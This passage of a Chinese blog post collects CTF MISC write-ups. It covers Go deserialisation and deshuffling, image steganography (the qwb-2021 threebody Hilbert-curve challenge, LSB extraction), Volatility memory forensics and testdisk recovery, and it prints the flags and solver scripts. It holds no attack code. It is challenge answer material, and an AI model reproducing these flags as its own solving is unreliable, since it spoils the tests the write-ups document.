<img src="/2023/03/09/MISC-Write-Up-zh/image-20230423172325054.png" class="" title="image-20230423172325054">

<p>检索得到：<a href="https://any.run/report/0d7aa23a72d22dcf47f8723c58d101b3b113cbc79dd407a6fac0e65d67076ea1/2211f4a0-81e4-432d-87a8-c7c285a5a919">Malware analysis extracted_at_0x22a7b.exe Malicious activity | ANY.RUN - Malware Sandbox Online</a></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230421150620900.png" class="" title="image-20230421150620900">

<p>得到api的<code>url</code>为<code>http://api.ipify.org</code></p>
<p>md5得到压缩密码为<code>08229f4052dde89671134f1784bed2d6</code></p>
<p>得到<code>flag</code>文件。</p>
<h2 id="go文件"><a href="#go文件" class="headerlink" title="go文件"></a>go文件</h2><p>得到的文件使用<code>WINHEX</code>打开一下，发现提示了文件类型，是<code>Gob</code>文件</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230421151511429.png" class="" title="image-20230421151511429">

<p>利用属性来进行定义，从而反序列化。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230421152349138.png" class="" title="image-20230421152349138">



<p>导包的时候出现了<code>missing path</code>，找了报错原因，没解决，后来发现是因为格式错了。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;math/rand&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p><em>然后脚本的原理暂且还不太理解，先放着。</em></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;math/rand&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">//seed init</span></span><br><span class="line">	loc, _ := time.LoadLocation(<span class="string">&quot;Local&quot;</span>)</span><br><span class="line">	timeObj, _ := time.ParseInLocation(</span><br><span class="line">		<span class="string">&quot;2006-01-02 15:04:05&quot;</span>,</span><br><span class="line">		<span class="string">&quot;2022-07-19 14:49:56&quot;</span>, loc)</span><br><span class="line">	seed := timeObj.Unix()</span><br><span class="line">	rand.Seed(seed)</span><br><span class="line"></span><br><span class="line">	input, _ := os.Open(<span class="string">&quot;./src.png&quot;</span>)</span><br><span class="line">	in := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">70475</span>)</span><br><span class="line">	lenx, _ := input.Read(in)</span><br><span class="line">	table := <span class="built_in">make</span>([]<span class="type">int</span>, lenx)</span><br><span class="line">	out := <span class="built_in">make</span>([]<span class="type">byte</span>, lenx)</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; lenx; i++ &#123;</span><br><span class="line">		table[i] = i</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//shuffle</span></span><br><span class="line">	rand.Shuffle(<span class="built_in">len</span>(table), <span class="function"><span class="keyword">func</span><span class="params">(i, j <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">		table[i], table[j] = table[j], table[i]</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; lenx; i++ &#123;</span><br><span class="line">		out[table[i]] = in[i]</span><br><span class="line">	&#125;</span><br><span class="line">	output, _ := os.Create(<span class="string">&quot;./flag.png&quot;</span>)</span><br><span class="line">	output.Write(out)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>得到图片。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/flag.png" class="" title="flag">

<h2 id="图片隐写"><a href="#图片隐写" class="headerlink" title="图片隐写"></a>图片隐写</h2><p><em>搞出一张图片了，但没明白为啥图片的大小就是<code>70450bytes</code>，有点迷惑。</em></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230421155213728.png" class="" title="image-20230421155213728">

<p>没找到合适的工具提取隐写，十有八九是提取像素点的。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&#x27;flag.png&#x27;</span>)</span><br><span class="line">arr = np.array(img)</span><br><span class="line"></span><br><span class="line">ans = <span class="built_in">bytes</span>(arr[:, :, <span class="number">3</span>].reshape(<span class="number">2000</span> * <span class="number">973</span>)).replace(<span class="string">b&#x27;\xff&#x27;</span>, <span class="string">b&#x27;&#x27;</span>).replace(<span class="string">b&#x27;\x00&#x27;</span>, <span class="string">b&#x27;&#x27;</span>).decode()[:<span class="number">42</span>]</span><br><span class="line"><span class="built_in">print</span>(ans)</span><br><span class="line"><span class="comment"># flag&#123;898161df-fabf-4757-82b6-ffe407c69475&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># from PIL import Image</span></span><br><span class="line"><span class="comment"># pic = Image.open(&#x27;flag.png&#x27;)</span></span><br><span class="line"><span class="comment"># w, h = pic.size</span></span><br><span class="line"><span class="comment"># flag = []</span></span><br><span class="line"><span class="comment"># for i in range(h):</span></span><br><span class="line"><span class="comment">#     for j in range(w):</span></span><br><span class="line"><span class="comment">#         piexl = list(pic.getpixel((j, i)))[3]</span></span><br><span class="line"><span class="comment">#         if(piexl != 0xff):</span></span><br><span class="line"><span class="comment">#             flag.append(chr(int(piexl)))</span></span><br><span class="line"><span class="comment">#             if len(flag) == 42:</span></span><br><span class="line"><span class="comment">#                 print(&#x27;&#x27;.join(flag))</span></span><br></pre></td></tr></table></figure>

<p>最后得到<code>flag&#123;898161df-fabf-4757-82b6-ffe407c69475&#125;</code></p>
<h1 id="qwb-2021-threebody"><a href="#qwb-2021-threebody" class="headerlink" title="[qwb-2021]threebody"></a>[qwb-2021]threebody</h1><blockquote>
<p><a href="https://www.anquanke.com/post/id/244533">用图片讲一个故事——第五届强网杯Threebody题目官方题解-安全客 - 安全资讯平台 (anquanke.com)</a></p>
</blockquote>
<h2 id="stegsolve查看发现图片"><a href="#stegsolve查看发现图片" class="headerlink" title="stegsolve查看发现图片"></a>stegsolve查看发现图片</h2><p>你们都是虫子。</p>
<h2 id="放大发现像素点数"><a href="#放大发现像素点数" class="headerlink" title="放大发现像素点数"></a>放大发现像素点数</h2><p>相邻像素点数值相差较大。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230308100114529.png" class="" title="image-20230308100114529">

<p>仔细观察发现如果以4为周期相差像素点数值将相差不大。 -&gt; 修改像素点所占比特数<code>biBitCount 24 -&gt; 32</code></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230308094743609.png" class="" title="image-20230308094743609">

<p>得到真实图片。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/threebody_output.bmp" class="" title="true threebody">

<h2 id="再使用solvesolve进行分析"><a href="#再使用solvesolve进行分析" class="headerlink" title="再使用solvesolve进行分析"></a>再使用solvesolve进行分析</h2><img src="/2023/03/09/MISC-Write-Up-zh/image-20230215130857823.png" class="">

<p><code>stegsolve</code>进行提取。行列都存在隐写数据。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/steg1.png" class="" title="row">

<img src="/2023/03/09/MISC-Write-Up-zh/steg2.png" class="">

<p>可得提示<code>希尔伯特曲线</code></p>
<h2 id="冗余数据赋值"><a href="#冗余数据赋值" class="headerlink" title="冗余数据赋值"></a>冗余数据赋值</h2><p>观察图片发现存在<code>rgbReserved</code>的字段，表示<code>stegsolve</code>还存在无法识别的通道。</p>
<p>两种方法。</p>
<ul>
<li><code>bmp</code>转化成<code>png</code></li>
<li><code>blue</code>通道跟<code>Reserved</code>通道大小相近，直接暴力赋值</li>
</ul>
<h3 id="bmp转化成png"><a href="#bmp转化成png" class="headerlink" title="bmp转化成png"></a>bmp转化成png</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">image=Image.new(mode=<span class="string">&#x27;RGBA&#x27;</span>,size=(<span class="number">580</span>,<span class="number">435</span>))</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&#x27;threebody.bmp&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    file=f.read()</span><br><span class="line">    index=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">434</span>,-<span class="number">1</span>,-<span class="number">1</span>):  <span class="comment">#根据bmp的结构知道该bmp文件上下倒序存储像素值</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">580</span>):</span><br><span class="line">            s=[]</span><br><span class="line">            <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">                s.append(file[index])</span><br><span class="line">                index+=<span class="number">1</span></span><br><span class="line">            image.putpixel((j,i),(s[<span class="number">2</span>],s[<span class="number">1</span>],s[<span class="number">0</span>],s[<span class="number">3</span>]))  <span class="comment">#</span></span><br><span class="line">    image.show()</span><br><span class="line">    image.save(<span class="string">&#x27;threebody_new.png&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="暴力赋值"><a href="#暴力赋值" class="headerlink" title="暴力赋值"></a>暴力赋值</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;threebody.bmp&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    d = f.read()</span><br><span class="line"></span><br><span class="line">w = <span class="number">580</span></span><br><span class="line">h = <span class="number">435</span></span><br><span class="line">b = <span class="number">4</span></span><br><span class="line">l = <span class="built_in">bytearray</span>(d)</span><br><span class="line">off = l[<span class="number">10</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(h):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(w):</span><br><span class="line">        l[off+j*b+i*b*w] = l[off+j*b+i*b*w+<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;threebody_new.bmp&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(l)</span><br></pre></td></tr></table></figure>



<h2 id="希尔伯特曲线"><a href="#希尔伯特曲线" class="headerlink" title="希尔伯特曲线"></a>希尔伯特曲线</h2><blockquote>
<p>reference: <a href="https://mp.weixin.qq.com/s/IOSGOJnGyiGoD8J1ITQJlg">真·降维打击！《三体》中二向箔吞噬地球的场景成真了！这位B站Up主过于硬核…… (qq.com)</a></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="comment">#安装：pip install -i https://pypi.tuna.tsinghua.edu.cn/simple hilbertcurve</span></span><br><span class="line"><span class="keyword">from</span> hilbertcurve.hilbertcurve <span class="keyword">import</span> HilbertCurve</span><br><span class="line"><span class="comment">#提取像素数据</span></span><br><span class="line"><span class="keyword">with</span> Image.<span class="built_in">open</span>(<span class="string">&#x27;threebody_new.png&#x27;</span>) <span class="keyword">as</span> img:</span><br><span class="line">    arr = np.asarray(img)</span><br><span class="line">arr = np.vectorize(<span class="keyword">lambda</span> x: x&amp;<span class="number">1</span>)(arr[:,:,<span class="number">2</span>])</span><br><span class="line"><span class="comment">#确定图片中的有效区域</span></span><br><span class="line"><span class="keyword">for</span> x1 <span class="keyword">in</span> <span class="built_in">range</span>(np.size(arr,<span class="number">0</span>)):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">sum</span>(arr[x1])&gt;<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">for</span> x2 <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(np.size(arr,<span class="number">0</span>))):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">sum</span>(arr[x2])&gt;<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">for</span> y1 <span class="keyword">in</span> <span class="built_in">range</span>(np.size(arr,<span class="number">1</span>)):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">sum</span>(arr[:,y1])&gt;<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">for</span> y2 <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(np.size(arr,<span class="number">1</span>))):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">sum</span>(arr[:,y2])&gt;<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment">#剪切出有效二维数据</span></span><br><span class="line">arr = arr[x1:x2+<span class="number">1</span>, y1:y2+<span class="number">1</span>]</span><br><span class="line"><span class="comment">#print(x2+1-x1)#得出是128*128的矩阵</span></span><br><span class="line"><span class="comment">#构建希尔伯特曲线对象</span></span><br><span class="line">hilbert_curve = HilbertCurve(<span class="number">7</span>, <span class="number">2</span>)</span><br><span class="line"><span class="comment">#生成一维的二进制流数据</span></span><br><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(np.size(arr)):</span><br><span class="line">    [x,y] = hilbert_curve.point_from_distance(i)</span><br><span class="line">    s += <span class="built_in">str</span>(arr[<span class="number">127</span>-y][x])</span><br><span class="line"><span class="comment">#转ASCII文本写入文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="built_in">int</span>(s,<span class="number">2</span>).to_bytes(<span class="number">2048</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><em>但这个一直没能实现，不清楚是不是没剪切图片的原因。</em></p>
<p><em><strong>0228，笑死，真的是因为没剪切的原因。</strong></em></p>
<h2 id="C语言编译"><a href="#C语言编译" class="headerlink" title="C语言编译"></a>C语言编译</h2><p>打开<code>output.txt</code>发现是C语言脚本，所以用VSCode进行编译运行，发现打印的是自身。</p>
<blockquote>
<p>出题人的知识点：</p>
<p>这种可以打印自身的程序学名叫Quine</p>
</blockquote>
<p>即使看似是相同的文件，可能存在某种差异，直接用<code>BCompare4</code>对原始文件以及输出文件进行对比，发现在文件的第11行存在差别。</p>
<p>原始文件存在<code>Tab</code>以及<code>Space</code>，转化成<code>01</code>数据流。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230228110003750.png" class="" title="image-20230228110003750">

<p>用<code>Notepad++</code>得到<code>01</code>数据流。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">01100110011011000110000101100111011110110100010000110001011011010100010101101110001101010110100100110000011011100100000101101100010111110101000001110010001100000011011000110001011001010110110101111101</span><br></pre></td></tr></table></figure>

<h2 id="数据处理"><a href="#数据处理" class="headerlink" title="数据处理"></a>数据处理</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">output = <span class="string">&#x27;2009092020090920200909200909202020090920202020092009092020090909200909090920090920092020200920202020090920202009200909200909200920092020200920092009092009090920202009092009200920090920092020092020090920202020200909200909092020092020202020092009092009092020200920090909090920092009202020202009090920200920202009092020202020200909200909202020090920202009200909202009200920090920090920092009090909092009&#x27;</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">output = output.replace(<span class="string">&#x27;20&#x27;</span>, <span class="string">&#x27;0&#x27;</span>).replace(<span class="string">&#x27;09&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"><span class="comment"># print(output)</span></span><br><span class="line"><span class="comment"># 01100110011011000110000101100111011110110100010000110001011011010100010101101110001101010110100100110000011011100100000101101100010111110101000001110010001100000011011000110001011001010110110101111101</span></span><br><span class="line">a = re.findall(<span class="string">r&#x27;.&#123;8&#125;&#x27;</span>, output)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    flag += <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">int</span>(i, <span class="number">2</span>)))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># flag&#123;D1mEn5i0nAl_Pr061em&#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="护网杯2018-easy-dump"><a href="#护网杯2018-easy-dump" class="headerlink" title="[护网杯2018]easy_dump"></a>[护网杯2018]easy_dump</h1><h2 id="利用vol查看镜像信息"><a href="#利用vol查看镜像信息" class="headerlink" title="利用vol查看镜像信息"></a>利用vol查看镜像信息</h2><p><code>vol.py -f easy_dump.img imageinfo</code><img src="/2023/03/09/MISC-Write-Up-zh/image-20230309102823595.png" class="" title="image-20230309102823595"></p>
<p><em>一般以镜像前1，2个操作系统为分析重点，eg: Win7SP1x64</em></p>
<h2 id="指定镜像进行进程扫描"><a href="#指定镜像进行进程扫描" class="headerlink" title="指定镜像进行进程扫描"></a>指定镜像进行进程扫描</h2><p><code>vol.py -f easy_dump.img --profile=WinSP1x64 pslist</code></p>
<p><code>vol.py -f easy_dump.img --profile=WinSP1x64 pstree</code></p>
<p><code>vol.py -f easy_dump.img --profile=WinSP1x64 psscan</code></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230309103714601.png" class="" title="image-20230309103714601">

<p><em>发现可疑进程<code>notepad.exe</code>，那么我们直接把记事本内容给提取出来。</em></p>
<h2 id="记事本内容dump"><a href="#记事本内容dump" class="headerlink" title="记事本内容dump"></a>记事本内容dump</h2><p><code>vol.py -f easy_dump.img --profile=Win7SP1x64 memdump -p 2616 -D ./</code></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230309104153529.png" class="" title="image-20230309104153529">

<p><em>把记事本内容dump出来，利用string-grep对dmp文件内容进行检索。</em></p>
<h2 id="记事本内容直接搜索"><a href="#记事本内容直接搜索" class="headerlink" title="记事本内容直接搜索"></a>记事本内容直接搜索</h2><p><code>strings -eb 2616.dmp | grep flag </code></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230309111116109.png" class="" title="image-20230309111116109">

<p><em>-el 也适用， -u相关用法不太不清楚具体案例，从而得到提示，找jpg文件。</em></p>
<h2 id="根据提示查找图片并导出"><a href="#根据提示查找图片并导出" class="headerlink" title="根据提示查找图片并导出"></a>根据提示查找图片并导出</h2><p><code>vol.py -f easy_dump.img --profile=Win7SP1x64 filescan | grep .jpg</code></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230309111924885.png" class="" title="image-20230309111924885">

<p><em>grep进行过滤，也可用其他形式进行检索，主体包含jpg即可。</em></p>
<p><code>vol.py -f easy_dump.img --profile=Win7SP1x64 dumpfiles -Q 0x000000002408c460 -D ./</code></p>
<img src="/2023/03/09/MISC-Write-Up-zh/phos.jpg" class="" title="phos.jpg">

<p><em>直接导出的就是<code>file:xxxx</code>的格式，我们直接按照需求把文件改成原始文件名即可，eg: phos.jpg</em></p>
<h2 id="图片隐写分析"><a href="#图片隐写分析" class="headerlink" title="图片隐写分析"></a>图片隐写分析</h2><p>有图片就回归到图片方面的隐写分析之上。</p>
<p><code>binwalk</code>分析，发现存在<code>zip</code>，那么直接对其进行<code>foremost</code>提取。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230309112732389.png" class="" title="image-20230309112732389">

<p>提取出来一个<code>message.img</code>。</p>
<p>再次进行提取操作，本次使用<code>binwalk -e</code> 进行提取<code>hint.txt</code>。</p>
<p><em>使用foremost无法分离出来<code>hint.txt</code>文件</em></p>
<h2 id="生成二维码"><a href="#生成二维码" class="headerlink" title="生成二维码"></a>生成二维码</h2><ul>
<li><code>gnuplot</code>转换</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gnuplot         </span><br><span class="line">        G N U P L O T</span><br><span class="line">        Version <span class="number">5.4</span> patchlevel <span class="number">4</span>    last modified <span class="number">2022</span>-07-<span class="number">10</span> </span><br><span class="line"></span><br><span class="line">        Copyright (C) <span class="number">1986</span>-<span class="number">1993</span>, <span class="number">1998</span>, <span class="number">2004</span>, <span class="number">2007</span>-<span class="number">2022</span></span><br><span class="line">        Thomas Williams, Colin Kelley <span class="keyword">and</span> many others</span><br><span class="line"></span><br><span class="line">        gnuplot home:     http://www.gnuplot.info</span><br><span class="line">        faq, bugs, etc:   <span class="built_in">type</span> <span class="string">&quot;help FAQ&quot;</span></span><br><span class="line">        immediate <span class="built_in">help</span>:   <span class="built_in">type</span> <span class="string">&quot;help&quot;</span>  (plot window: hit <span class="string">&#x27;h&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Terminal <span class="built_in">type</span> <span class="keyword">is</span> now <span class="string">&#x27;qt&#x27;</span></span><br><span class="line">gnuplot&gt; plot<span class="string">&#x27;hint.txt&#x27;</span></span><br><span class="line">gnuplot&gt; </span><br></pre></td></tr></table></figure>

<p><em>然后直接输出二维码图片</em></p>
<ul>
<li>脚本转换 <em>暂且没成功……</em> -&gt; <em><strong>成功了，原终端为agg，无图形界面，需要切换为图形界面显示的终端TkAgg</strong></em></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> matplotlib <span class="comment"># keypoint</span></span><br><span class="line">matplotlib.use(<span class="string">&#x27;TkAgg&#x27;</span>) <span class="comment"># keypoint</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">x = []</span><br><span class="line">y = []</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;hint.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    datas = f.readlines()</span><br><span class="line">    <span class="keyword">for</span> data <span class="keyword">in</span> datas:</span><br><span class="line">        arr = data.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        x.append(<span class="built_in">int</span>(arr[<span class="number">0</span>]))</span><br><span class="line">        y.append(<span class="built_in">int</span>(arr[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">plt.plot(x, y, <span class="string">&#x27;ks&#x27;</span>, ms=<span class="number">1</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p><em>扫描即可得到信息：1. 维吉尼亚密钥为<code>aeolus</code> 2. 加密后的密文被删除了</em></p>
<h2 id="恢复镜像删除信息"><a href="#恢复镜像删除信息" class="headerlink" title="恢复镜像删除信息"></a>恢复镜像删除信息</h2><p>使用<code>testdisk</code>进行恢复：<code>testdisk message.img</code>，进入相应的操作界面。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230309133925809.png" class="" title="image-20230309133925809">

<p>进入<code>Proceed</code>。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230309134503976.png" class="" title="image-20230309134503976">

<p>进入<code>None</code>。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230309134823519.png" class="" title="image-20230309134823519">

<p>因为涉及删除的文件，所以直接找该功能模块<code>Undelete</code>。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230309134918426.png" class="" title="image-20230309134918426">

<p>找到标红处，说明该处存在删除文件。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230309135112638.png" class="" title="image-20230309135112638">

<p>按<code>c</code>确定文件以及路径之后，出现该红框内内容说明导出成功。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230309135208693.png" class="" title="image-20230309135208693">

<p>到保存路径之下，使用<code>ls -a</code>发现保存下来的文件，直接利用<code>strings</code>查找字符串即可。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230309135334653.png" class="" title="image-20230309135334653">

<p>找到加密后的密文，使用在线解密网站结合密钥解密即可，最终得到相应的flag。</p>
<h1 id="国赛-everlasting-night"><a href="#国赛-everlasting-night" class="headerlink" title="[国赛]everlasting_night"></a>[国赛]everlasting_night</h1><blockquote>
<p><a href="https://www.somd5.com/">MD5免费在线解密破解_MD5在线加密-SOMD5</a></p>
</blockquote>
<h2 id="利用stegsolve得到隐藏密钥"><a href="#利用stegsolve得到隐藏密钥" class="headerlink" title="利用stegsolve得到隐藏密钥"></a>利用stegsolve得到隐藏密钥</h2><ol>
<li>stegsolve导入图片，通过下方左右箭头进行查看，发现alpha 2通道右下角存在列向隐藏数据</li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220817104928044.png" class="" title="image-20220817104928044">

<ol start="2">
<li>选项卡<code>Analyse</code>的下拉列表选择<code>Data Extract</code>，得到<code>f78dcd383f1b574b</code></li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220817105636959.png" class="" title="image-20220817105636959">

<p>！在靠近最下边，稍微仔细查看</p>
<h2 id="cloacked-pixel提取lsb隐写文件"><a href="#cloacked-pixel提取lsb隐写文件" class="headerlink" title="cloacked-pixel提取lsb隐写文件"></a>cloacked-pixel提取lsb隐写文件</h2><blockquote>
<p>使用条件：</p>
<ol>
<li>存在lsb隐写</li>
<li>得到密钥</li>
</ol>
</blockquote>
<ol>
<li>stegsolve无法提取lsb隐写文件+得到密钥，考虑另一种带密钥的lsb隐写，即<code>cloacked-pixel</code></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python2实现</span></span><br><span class="line">LSB steganogprahy. Hide files within least significant bits of images.</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  lsb.py hide &lt;img_file&gt; &lt;payload_file&gt; &lt;password&gt;</span><br><span class="line">  lsb.py extract &lt;stego_file&gt; &lt;out_file&gt; &lt;password&gt;</span><br><span class="line">  lsb.py analyse &lt;stego_file&gt;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>把图片放到<code>cloacked-pixel</code>路径之下，命令行输入<code>python2 lsb.py extract 1.png flag.txt f78dcd383f1b574b </code></li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220817112820031.png" class="" title="image-20220817112820031">

<ol start="3">
<li>打开<code>flag.txt</code>，发现可能是zip，修改后缀名，得到<code>flag.zip</code>。</li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220817112955170.png" class="" title="image-20220817112955170">

<ol start="4">
<li>解压缩，发现需要解压密钥，用winhex判断一下，发现应当是真加密。</li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220817113531517.png" class="" title="image-20220817113531517">

<img src="/2023/03/09/MISC-Write-Up-zh/image-20220817113353325.png" class="" title="image-20220817113353325">

<img src="/2023/03/09/MISC-Write-Up-zh/image-20220817113429578.png" class="" title="image-20220817113429578">

<h2 id="winhex通过png文件尾得到一段MD5密文并解密"><a href="#winhex通过png文件尾得到一段MD5密文并解密" class="headerlink" title="winhex通过png文件尾得到一段MD5密文并解密"></a>winhex通过png文件尾得到一段MD5密文并解密</h2><blockquote>
<p>PNG (png)：</p>
<p>文件头：89504E47文件尾：AE426082</p>
</blockquote>
<ol>
<li>Winhex导入图片，选择左上角选项卡<code>搜索</code>，下拉框选择<code>查找十六进制数据</code>，输入png文件尾<code>AE426082</code></li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220817110723743.png" class="" title="image-20220817110723743">

<ol start="2">
<li>发现png文件结束后，存在一段密文<code>FB3EFCE4CEAC2F5445C7AE17E3E969AB</code></li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220817111251100.png" class="" title="image-20220817111251100">

<ol start="3">
<li>因为是32位的16进制字符串，一般先考虑是否是MD5密文，经过解密，得到一段密钥<code>ohhWh04m1</code></li>
</ol>
<blockquote>
<p><a href="https://www.somd5.com/">MD5免费在线解密破解_MD5在线加密-SOMD5</a></p>
<p>cmd5.com无法解出。</p>
</blockquote>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220817111432548.png" class="" title="image-20220817111432548">

<ol start="4">
<li>利用该密钥对<code>flag.zip</code>进行解压缩得到<code>flag</code></li>
</ol>
<h2 id="gimp打开图片并进行爆破"><a href="#gimp打开图片并进行爆破" class="headerlink" title="gimp打开图片并进行爆破"></a>gimp打开图片并进行爆破</h2><blockquote>
<p>gimp为kali的PS处理软件</p>
</blockquote>
<ol>
<li>得到<code>flag</code>，winhex查看发现是应当是png文件，但修改后缀名发现无法打开</li>
<li>修改<code>flag</code>后缀名为<code>.data</code>，输入命令行<code>gimp flag.data</code></li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220817115325855.png" class="" title="image-20220817115325855">

<ol start="3">
<li>发现图片需要处理，图形内容扭曲，一般考虑是高度不变，宽度改变。经过试验，宽度应当为<code>352</code></li>
</ol>
